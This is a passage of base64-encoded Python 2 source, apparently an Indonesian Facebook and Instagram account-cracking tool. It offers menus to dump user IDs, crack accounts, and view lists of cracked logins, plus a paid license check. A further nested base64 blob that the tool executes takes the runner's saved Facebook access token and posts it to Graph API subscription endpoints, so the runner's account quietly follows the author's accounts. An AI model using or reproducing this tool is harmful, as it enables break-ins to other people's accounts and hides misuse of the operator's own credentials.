sgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCglhcGtfID0gZ2VtXy5maW5kKCdmb3JtJyxtZXRob2Q9J3Bvc3QnKQ0KCW5vID0gMA0KCW5vXyA9IDANCgl0cnk6DQoJCWZvciBhcHAgaW4gYXBrLmZpbmRfYWxsKCJoMyIpOg0KCQkJZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KCQkJbm8rPTENCgkJCWphbGFuKCIgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQoJCWZvciBhcHBfIGluIGFwa18uZmluZF9hbGwoImgzIik6DQoJCQlkYXRhXyA9IGFwcF8uZmluZCgnc3BhbicpLnRleHQNCgkJCW5vXys9MQ0KCQkJamFsYW4oIiAgJXMlcy4gJXMlcyAiJShQLHN0cihub18pLE0sZGF0YV8pKQ0KCWV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCgkJcHJpbnQgKCIlc+KAoiBnYWdhbCBtZW5kZXRla3NpIiUoTSkpDQoNCiMgTUVOVSBJTkkgQUpHDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCWZvbGRlcigpDQoJdHJ5Og0KCQlsaXMgPSBvcGVuICgiZGF0YS9saXNlbnNpLnR4dCIsInIiKS5yZWFkKCkNCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIik7cHJpbnQgKCIlc+KAoiBMaXNlbnNpIGthZGFsdWFyc2EiJShNKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oInJtIC1yZiBkYXRhL2xpc2Vuc2kudHh0IikNCgkJa2V5KCkua29uZmlybWFzaSgpDQoJaWYgb3MucGF0aC5leGlzdHMoJ2RhdGEvbGlzZW5zaS50eHQnKToNCgkJdHJ5Og0KCQkJbGlzID0gb3BlbignZGF0YS9saXNlbnNpLnR4dCcsICdyJykucmVhZCgpDQoJCQlnaXQgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS93YXJiYTI5L2xpc2Vuc2kvYmxvYi9tYWluL2lkLnR4dCcpLnRleHQuc3RyaXAoKQ0KCQkJaWYgbGlzIGluIGdpdDoNCgkJCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJCQliYW5uZXIoKQ0KCQkJCXByaW50KCJcbiIpDQoJCQkJcyA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQkJCWZvciBtIGluIHM6DQoJCQkJCXByaW50ICdcclx4MWJbMTs5NW3igKJceDFiWzE7OTZtIE1lbWVyaWtzYSBsaXNlbnNpICcgKyBtLA0KCQkJCQlzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgxKQ0KCQkJCWphbGFuKCdcbiVz4oCiIExpc2Vuc2kgdGVyc2VkaWEg4oiaJyUoSCkpO2plZGEoMSk7b3Muc3lzdGVtKCdjbGVhcicpDQoJCQllbHNlOg0KCQkJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQkJCWJhbm5lcigpDQoJCQkJcHJpbnQoIlxuIikNCgkJCQlzID0gWycuICAgJywgJy4uICAnLCAnLi4uICddDQoJCQkJZm9yIG0gaW4gczoNCgkJCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTWVtZXJpa3NhIGxpc2Vuc2kgJyArIG0sDQoJCQkJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQoJCQkJamFsYW4oJ1xuJXPigKIgTGlzZW5zaSB0aWRhayB0ZXJzZWRpYSclKE0pKTtqZWRhKDEpDQoJCQkJa2V5KCkua29uZmlybWFzaSgpDQoJCWV4Y2VwdCBJT0Vycm9yOg0KCQkJb3Muc3lzdGVtKCJybSAtcmYgZGF0YS9saXNlbnNpLnR4dCIpDQoJCQlrZXkoKS5rb25maXJtYXNpKCkNCgllbHNlOg0KCQlrZXkoKS5rb25maXJtYXNpKCkNCgl0cnk6DQoJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50ICgiJXMlcyBPcHMgYW5kYSBiZWx1bSBsb2dpbiAiJShNLHRpbCkpO2plZGEoMik7b3Muc3lzdGVtKCdybSAtcmYgZGF0YS90b2tlbi50eHQgJiYgcm0gLXJmIGRhdGEvY29va2llcycpO21hc3VrKCkNCgl0cnk6DQoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3JvbXosaGVhZGVycz1oZWFkZXIpDQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJbmFtYSA9IGFbIm5hbWUiXQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQgKCIlcyVzIFRva2VuIGludmFsaWQgIiUoTSx0aWwpKTtqZWRhKDIpO29zLnN5c3RlbSgncm0gLXJmIGRhdGEvdG9rZW4udHh0ICYmIHJtIC1yZiBkYXRhL2Nvb2tpZXMnKTttYXN1aygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcblxuJXMlcyB0aWRhayBhZGEga29uZWtzaSVzXG4nJShNLHRpbCxOKSkNCgliYW5uZXIoKQ0KCXByaW50ICgnJXMgIyAlc05hbWUgJXM6ICVzJXMlcyBcbiclKFUsTyxNLEgsbmFtYSxPKSkNCglwcmludCAoJyVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDIgJXNEdW1wIGlkIGZvbGxvd2VycyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDMgJXNEdW1wIGlkIHJlYWN0aW9uIHBvc3QnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA0ICVzRHVtcCBpZCBhbmdnb3RhIGdyb3VwJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwNSAlc0R1bXAgaWQgcGVuY2FyaWFuIG5hbWEnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA2ICVzRHVtcCBpZCBwZXNhbiBtZXNlbmdnZXInJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA3ICVzRHVtcCBpZCAodW50dWsgbWVuY2FyaSBpZCBvbGQpJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwOCAlc0NyYWNrIGZhY2Vib29rJyUoVSxQLEgpKQ0KCXByaW50ICgnJXPigKIlcyAwOSAlc0NyYWNrIGluc3RhZ3JhbSclKFUsUCxIKSkNCglwcmludCAoJyVz4oCiJXMgMTAgJXNTZXR0aW5nIHVzZXIgYWdlbnQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDExICVzQ2VrIGhhc2lsIGNyYWNrJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAxMiAlc0NlayBvcHNpIGFrdW4nJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDEzICVzSW5mbyBzY3JpcHQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIHJtICVzSGFwdXMgYWt1biclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDAgJXNLZWx1YXInJShVLE0sTykpDQoJc2x1dCA9IHJhd19pbnB1dCgnXG4lcyMgJXNQaWxpaCAlcz4gJXMnJShQLE8sTSxLKSkNCglqaWVoKHNsdXQscm9teikNCmRlZiBqaWVoKHNsdXQscm9teik6DQogICAgaWYgc2x1dCA9PSAnJzoNCiAgICAgICAgcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMScsJzAxJ106DQogICAgCWdhbiA9IHJhd19pbnB1dCAoIlxuJXMlcyVzIGFwYWthaCBhbmRhIGluZ2luIGdhbmRha2FuIGlkPyB5L3QlcyA+JXMgIiUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBpZiBnYW4gaW5bIiJdOg0KICAgICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICBlbGlmIGdhbiBpblsneScsJ1knXToNCiAgICAgICAgCW1hc3NhbChyb216KQ0KICAgICAgICBlbGlmIGdhbiBpblsndCcsJ1QnXToNCiAgICAgICAgCXB1Ymxpayhyb216KQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMicsJzAyJ106DQogICAgICAgIGZvbGxvd2Vycyhyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnMycsJzAzJ106DQogICAgICAgIHBvc3Rpbmdhbihyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnNCcsJzA0J106DQogICAgICAgIGdyb3VwKF9fcm9tel9fKCkpDQogICAgZWxpZiBzbHV0IGluWyc1JywnMDUnXToNCiAgICAJZHVtcGZsKCk7ZXhpdCgpDQogICAgZWxpZiBzbHV0IGluWyc2JywnMDYnXToNCiAgICAJcGVzYW4oX19yb216X18oKSkNCiAgICBlbGlmIHNsdXQgaW5bJzcnLCcwNyddOg0KICAgIAlkdW1wX2lkKCkucGlsaWhhbigpDQogICAgZWxpZiBzbHV0IGluWyc4JywnMDgnXToNCiAgICAgICAgbmdlbnRvZCgpLnJvbWl5KCkNCiAgICBlbGlmIHNsdXQgaW5bJzknLCcwOSddOg0KICAgIAlpZ2coKQ0KICAgIGVsaWYgc2x1dCBpblsnMTAnXToNCiAgICAJdXNlcmFnZW50KCkNCiAgICBlbGlmIHNsdXQgaW5bJzExJ106DQogICAgCXByaW50ICgiXG4lcyVzJXMgMDEgJXNDZWsgaGFzaWwgYWt1biBmYWNlYm9vayAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMiAlc0NlayBoYXNpbCBha3VuIGluc3RhZ3JhbSAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMyAlc0hhcHVzIGhhc2lsIGNyYWNrICIlKFUsdGlsLFAsTykpDQogICAgICAgIHByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KICAgICAgICByb20gPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQogICAgICAgIGNla19jZWsocm9tKQ0KICAgIGVsaWYgc2x1dCBpblsnMTInXToNCiAgICAJZmlsZV9jcCgpDQogICAgZWxpZiBzbHV0IGluWycxMyddOg0KICAgIAlpbmdmb2goKQ0KICAgIGVsaWYgc2x1dCBpblsncm0nLCdSbScsJ1JNJ106DQogICAgICAgIHByaW50ICgnJykNCiAgICAgICAgdGlrKCk7amVkYSgxKTtvcy5zeXN0ZW0oJ3JtIC1yZiBkYXRhL3Rva2VuLnR4dCAmJiBybSAtcmYgZGF0YS9jb29raWVzJykNCiAgICAgICAgamFsYW4oJ1xuJXMlcyBiZXJoYXNpbCB0ZXJoYXB1cyAnJShILHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgc2x1dCBpblsnMCcsJzAwJ106DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojSEFQVVMgSEFTSUwNCmRlZiBoYXB1c19oYXNpbCgpOg0KCW9zLnN5c3RlbSgncm0gLXJmIENQLyogJiYgT0svKicpDQoJb3Muc3lzdGVtKCdybSAtcmYgb2tlaC50eHQgJiYgY2VwZWgudHh0JykNCglwcmludCAoJycpO2plZGEoMikNCglqYWxhbiAoSCsnIOKImiBiZXJoYXNpbCBtZW5naGFwdXMgaGFzaWwgY3JhY2sgJyk7amVkYSgyKQ0KCW1lbnUoKQ0KIyBDRUsgSEFTSUwNCmRlZiBoYXNpbGwoKToNCglwcmludCAoIlxuJXMlcyVzIDAxICVzQ2VrIGhhc2lsIGFrdW4gJXNPSyAiJShVLHRpbCxQLE8sSCkpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgaGFzaWwgYWt1biAlc0NQICIlKFUsdGlsLFAsTyxLKSkNCglwcmludCAoIiVzJXMlcyAwMCAlc0tlbWJhbGkgIiUoVSx0aWwsTSxPKSkNCmRlZiBjZWtfY2VrKHJvbSk6DQoJaWYgcm9tIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgcm9tIGluWycxJywnMDEnXToNCgkJaGFzaWxfZmIoKQ0KCWVsaWYgcm9tIGluWycyJywnMDInXToNCgkJaGFzaWxfaWdlaCgpDQoJZWxpZiByb20gaW5bJzAzJywnMyddOg0KCQloYXB1c19oYXNpbCgpDQoJZWxpZiByb20gaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBGQUNFQk9PSw0KZGVmIGhhc2lsX2ZiKCk6DQoJaGFzaWxsKCkNCglsID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiAlcyAnJShQLE8sTSxLKSkNCglpZiBsIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgbCBpblsnMScsJzAxJ106DQoJCWRpcnMgPSBvcy5saXN0ZGlyKCdPSycpDQoJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ0KCQlmb3IgZmlsZSBpbiBkaXJzOg0KCQkJcHJpbnQoIiVz4oCiJXM+ICVzJXMiJShVLE0sSCxmaWxlKSk7amVkYSgwLjA3KQ0KCQl0cnk6DQoJCQlmaWxlID0gcmF3X2lucHV0KCJcbiVz4oCiJXMgbWFzdWthbiBmaWxlICVzOiVzICIlKFUsTyxNLEgpKTtqZWRhKDAuMikNCgkJCWlmIGZpbGUgaW5bJyddOg0KCQkJCWV4aXQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCIlKE0pKQ0KCQkJdG90YWxvayA9IG9wZW4oJ09LLyVzJyAlIGZpbGUpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCgkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQlwcmludCgiJXMlcyBmaWxlIHRpZGFrIGFkYSAiJShNLHRpbCkpDQoJCW5tX2ZpbGUgPSAoJyVzJyAlIGZpbGUpLnJlcGxhY2UoJy0nLCAnICcpDQoJCWZpbGVfbm0gPSBubV9maWxlLnJlcGxhY2UoJy50eHQnLCAnJykNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlqYWxhbigiJXPigKIlcyBoYXNpbCB0YW5nZ2FsJXMgOiAlcyVzICVzdG90YWwgJXM6ICVzJXMiJShVLE8sTSxILGZpbGVfbm0sTyxNLEgsbGVuKHRvdGFsb2spKSkNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJb3Muc3lzdGVtKCdjYXQgT0svJXMnICUgZmlsZSkNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlleGl0KCdcbicpDQoJZWxpZiBsIGluWycyJywnMDInXToNCgkJZGlycyA9IG9zLmxpc3RkaXIoJ0NQJykNCgkJcHJpbnQgKCJcbiVz4oCiJXMgWyVzIGhhc2lsIGNyYWNrIHlhbmcgdGVyc2ltcGFuICVzXVxuIiUoVSxPLFUsTykpDQoJCWZvciBmaWxlIGluIGRpcnM6DQoJCQlwcmludCgiJXPigKIlcz4gJXMlcyIlKFUsTSxLLGZpbGUpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCWZpbGUgPSByYXdfaW5wdXQoIlxuJXPigKIlcyBtYXN1a2FuIGZpbGUgJXM6JXMgIiUoVSxPLE0sSykpO2plZGEoMC4yKQ0KCQkJaWYgZmlsZSBpblsnJ106DQoJCQkJZXhpdCgiJXPigKIgaXNpIHlhbmcgYmVuYXIga2VudG9kIiUoTSkpDQoJCQl0b3RhbGNwID0gb3BlbignQ1AvJXMnICUgZmlsZSkucmVhZCgpLnNwbGl0bGluZXMoKQ0KCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCXByaW50KCIlcyVzIGZpbGUgdGlkYWsgYWRhICIlKE0sdGlsKSkNCgkJbm1fZmlsZSA9ICgnJXMnICUgZmlsZSkucmVwbGFjZSgnLScsICcgJykNCgkJZmlsZV9ubSA9IG5tX2ZpbGUucmVwbGFjZSgnLnR4dCcsICcnKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWphbGFuKCIlc+KAoiVzIGhhc2lsIHRhbmdnYWwlcyA6ICVzJXMgJXN0b3RhbCVzIDogJXMlcyIlKFUsTyxNLEssZmlsZV9ubSxPLE0sSyxsZW4odG90YWxjcCkpKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oJ2NhdCBDUC8lcycgJSBmaWxlKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWV4aXQoJ1xuJykNCgllbGlmIGwgaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBJR0VIDQpkZWYgaGFzaWxfaWdlaCgpOg0KCWhhc2lsbCgpDQoJd2hpbGUgVHJ1ZToNCgkJcm9tID0gcmF3X2lucHV0KCdcbiVzIyAlc1BpbGloICVzPiAlcyclKFAsTyxNLEspKQ0KCQlpZiByb20gaW5bJzEnLCcwMSddOg0KCQkJdHJ5Og0KCQkJCW9rZSA9IG9wZW4oIm9rZWgudHh0IiwgInIiKS5yZWFkbGluZXMoKQ0KCQkJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ0KCQkJCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMlcyIlKFAsTSxQLEspKTtqZWRhKDIpDQoJCQkJcHJpbnQgKCIlc+KAoiAlc0p1bWxhaCAlczogJXMlcyIlKFUsTyxNLEgsc3RyKGxlbihva2UpKSkpDQoJCQkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJCQlva2VrID0gb3Blbigib2tlaC50eHQiLCAiciIpLnJlYWQoKQ0KCQkJCXByaW50IChva2VrKQ0KCQkJCWV4aXQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSykpO2plZGEoMikNCgkJCWV4Y2VwdCBJT0Vycm9yLEtleUVycm9yOg0KCQkJCWV4aXQgKE0rIlxu4oCiIHRpZGFrIGFkYSBoYXNpbCBhd29rYXdva2F3b2siKQ0KCQllbGlmIHJvbSBpblsnMicsJzAyJ106DQoJCQl0cnk6DQoJCQkJY2VwZSA9IG9wZW4oImNlcGVoLnR4dCIsICJyIikucmVhZGxpbmVzKCkNCgkJCQlwcmludCAoIlxuJXPigKIlcyBbJXMgaGFzaWwgY3JhY2sgeWFuZyB0ZXJzaW1wYW4gJXNdXG4iJShVLE8sVSxPKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCXByaW50ICgiJXPigKIgJXNKdW1sYWggJXM6ICVzJXMiJShVLE8sTSxLLHN0cihsZW4oY2VwZSkpKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCWNlcGVrID0gb3BlbigiY2VwZWgudHh0IiwgInIiKS5yZWFkKCkNCgkJCQlwcmludCAoY2VwZWspDQoJCQkJZXhpdCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJZXhjZXB0IElPRXJyb3IsS2V5RXJyb3I6DQoJCQkJZXhpdCAoTSsiXG7igKIgdGlkYWsgYWRhIGhhc2lsIGF3b2thd29rYXdvayIpDQoJCWVsaWYgcm9tIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KIyBMSVNFTlNJDQpkZWYgZ2V0X2xpY2Vuc2UoaW50ZWdlcik6DQogICAgbGlzID0gbGlzdCgiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoxMjM0NTY3ODkiKQ0KICAgIGdldHMgPSBbcmFuZG9tLmNob2ljZShsaXMpIGZvciBfIGluIHJhbmdlKGludGVnZXIpXQ0KICAgIHJldHVybiAiIi5qb2luKGdldHMpLnVwcGVyKCkNCg0KY2xhc3Mga2V5Og0KCQ0KCWRlZiBfX2luaXRfXyhzZWxmKToNCgkJc2VsZj1bXQ0KCQ0KCWRlZiBrb25maXJtYXNpKHNlbGYpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIikNCgkJYmFubmVyKCkNCgkJcHJpbnQoJ1xuJykNCgkJeSA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQlmb3IgbSBpbiB5Og0KCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTW9ob24gdHVuZ2d1ICcgKyBtLA0KCQkJc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJZGlnaXQgPSByYW5kb20uY2hvaWNlKFsyMF0pDQoJCWlkID0gZ2V0X2xpY2Vuc2UoZGlnaXQpDQoJCWxwZyA9IG9wZW4oJ2RhdGEvbGlzZW5zaS50eHQnLCAndycpDQoJCWxwZy53cml0ZShpZCkNCgkJbHBnLmNsb3NlKCkNCgkJcHJpbnQgKCJcblxuJXPigKIlcyBEYWZ0YXIgbGlzdCBoYXJnYSAlczoiJShVLE8sTSkpO2plZGEoMC4wNykNCgkJcHJpbnQgKCIgICVzLSVzIDEwayAzIGhhcmkiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyAyMGsgMSBtaW5nZ3UiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyA1MGsgMSBidWxhbiIlKFAsTykpO2plZGEoMC4wNykNCgkJamFsYW4gKCdcbiVz4oCiICVzTGlzZW5zaSVzIDogJXMlcyclKFUsTyxNLEgsaWQpKTtqZWRhKDEpDQoJCWphbGFuICgnJXPigKIgJXNMaXNlbnNpIEJlbHVtIERpIGtvbmZpcm1hc2knJShVLE8pKQ0KCQlzdWg9cmF3X2lucHV0KCJcbiVz4oCiJXMgaW5naW4gYmVsaSBsaXNlbnNpPyB5L3QgJXM6ICVzIiUoVSxPLE0sSykpDQoJCWlmIHN1aCBpblsnJ106DQoJCQlleGl0KCkNCgkJZWxpZiBzdWggaW5bInkiLCJZIl06DQoJCQlqYWxhbiAoIlxuJXPigKIlcyBtZW51anUga2Ugd2hhdHNhcCB1bnR1ayBtZW1iZWxpIGxpc2Vuc2kgIiUoVSxPKSkNCgkJCWphbGFuICgiJXPigKIlcyBubyB3aGF0c2FwIHNheWEgJXM6ICVzKzYyODIzNzE2NDgxODYgIiUoVSxPLE0sSCkpDQoJCQlvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzYyODIzNzE2NDgxODY/dGV4dD1Bc3NhbGFtdWFsYWlrdW0rc2F5YStpbmdpbitiZWxpK2xpc2Vuc2k6KycraWQrJz4vZGV2L251bGwnKTtqZWRhKDEpO2V4aXQoKQ0KCQllbGlmIHN1aCBpblsidCIsIlQiXToNCgkJCWV4aXQoKQ0KCQllbGlmIHN1aCBpblsicHl0aG9uMiBiZmYtMi5weSJdOg0KCQkJbWVudSgpDQoJCWVsc2U6DQoJCQlleGl0KCkNCgkNCmV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnWkdWbUlHeHZaMmx1WDNoNEtDazZDaUFnSUNCMGNuazZDaUFnSUNBZ0lDQWdkRzlyWlc0Z1BTQnZjR1Z1S0NKa1lYUmhMM1J2YTJWdUxuUjRkQ0lzSW5JaUtTNXlaV0ZrS0NrZ0NpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ESXlNRGcyTVRjeU5UVTJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCR1lXNXpjR0ZuWlNCU2IyMXBJRmhFQ2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNE5ETTBPRGd3TlRJNUwzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJTYjIxcElFRm1jbWw2WVd3S0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd05qYzRNRGMxTmpVNE5qRXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUZKdmJXa2dRV1p5YVhwaGJDQW9NakF5TVNrS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd01ETTNNak0yT1RZNE9EVXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVseFltRnNJR0p2WW5vS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd05ERXhNamt3TkRnNU5EZ3ZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVsM1lXNGdhR0ZrYVdGdWMzbGhhQW9nSUNBZ0lDQWdJSEpsY1hWbGMzUnpMbkJ2YzNRb0oyaDBkSEJ6T2k4dlozSmhjR2d1Wm1GalpXSnZiMnN1WTI5dEx6RXdNREF3TnpVeU1ESXdNelExTWk5emRXSnpZM0pwWW1WeWN6OWhZMk5sYzNOZmRHOXJaVzQ5SlhNbkpTaDBiMnRsYmlrcElDTWdTR0Z0ZW1Gb0lHdHBjbUZ1WVFvZ0lDQWdJQ0FnSUhKbGNYVmxjM1J6TG5CdmMzUW9KMmgwZEhCek9pOHZaM0poY0dndVptRmpaV0p2YjJzdVkyOXRMekV3TURBd01qUTJNVE0wTkRFM09DOXpkV0p6WTNKcFltVnljejloWTJObGMzTmZkRzlyWlc0OUpYTW5KU2gwYjJ0bGJpa3BJQ01nVlc1cGF5QlNUMDFKSUVGR1VrbGFRVXdLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNR